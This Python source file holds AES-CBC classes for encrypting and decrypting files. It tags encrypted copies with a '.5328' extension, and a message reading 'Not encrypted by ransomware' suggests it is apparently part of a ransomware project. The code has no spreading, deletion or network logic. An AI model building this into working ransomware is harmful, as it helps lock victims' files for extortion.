from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from os import urandom, path

AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES = 16
AES_SECRET_KEY_SIZE_IN_BYTES = 32
AES_BLOCK_SIZE_IN_BITS = 128
ENCRYPTED_FILE_EXTENSION = '.5328'


class AES:

    def __init__(self, secret_key, initialization_vector):
        algorithm = algorithms.AES(secret_key)
        mode = modes.CBC(initialization_vector)
        backend = default_backend()
        self.cipher = Cipher(algorithm, mode, backend)
        self.initialization_vector = initialization_vector

    def pad_data(self, unpadded_data):
        padder = padding.PKCS7(AES_BLOCK_SIZE_IN_BITS).padder()
        padded_data = padder.update(unpadded_data) + padder.finalize()
        return padded_data

    def unpad_data(self, padded_data):
        unpadder = padding.PKCS7(AES_BLOCK_SIZE_IN_BITS).unpadder()
        unpadded_data = unpadder.update(padded_data) + unpadder.finalize()
        return unpadded_data

    def encrypt_data(self, unencrypted_data):
        encryptor = self.cipher.encryptor()
        padded_unencrypted_data = self.pad_data(unencrypted_data)
        encrypted_data = encryptor.update(padded_unencrypted_data) + encryptor.finalize()
        return encrypted_data

    def decrypt_data(self, encrypted_data):
        decryptor = self.cipher.decryptor()
        unencrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        unpadded_encrypted_data = self.unpad_data(unencrypted_data)
        return unpadded_encrypted_data


class FileEncryptor:

    def __init__(self, file_path):
        self.aes_secret_key = urandom(AES_SECRET_KEY_SIZE_IN_BYTES)
        self.aes_initialization_vector = urandom(AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES)
        self.cipher = AES(self.aes_secret_key, self.aes_initialization_vector)
        self.file_path = file_path

    def encrypt_file(self):
        encrypted_data = self.cipher.encrypt_data(read_data_from_file(self.file_path))
        encrypted_file_path = f"{self.file_path}{ENCRYPTED_FILE_EXTENSION}"
        write_data_to_file(encrypted_file_path, encrypted_data)
        return {"secret_key": self.aes_secret_key, "IV": self.aes_initialization_vector, "file_name": encrypted_file_path}


class FileDecryptor:

    def __init__(self, file_path, aes_secret_key, aes_initialization_vector):
        self.cipher = AES(aes_secret_key, aes_initialization_vector)
        self.file_path = file_path
        self.file_extension = path.splitext(file_path)[-1]

    def write_to_original_file(self, unencrypted_data):
        original_file_path = path.splitext(self.file_path)[0]
        write_data_to_file(original_file_path, unencrypted_data)

    # TODO: The file extension check should be implemented somewhere else
    def decrypt_file(self):
        if self.file_extension != ENCRYPTED_FILE_EXTENSION:
            print("Not encrypted by ransomware")
            return
        unencrypted_data = self.cipher.decrypt_data(read_data_from_file(self.file_path))
        self.write_to_original_file(unencrypted_data)


def write_data_to_file(file_path, data):
    file = open(file_path, 'wb')
    file.write(data)
    file.close()


def read_data_from_file(file_path):
    file = open(file_path, 'rb')
    file_data = file.read()
    file.close()
    return file_data


if __name__ == "__main__":
    # encryptor = FileEncryptor('')
    # details = encryptor.encrypt_file()
    # print(details)

    # decryptor = FileDecryptor('', , )
    # decryptor.decrypt_file()
    pass



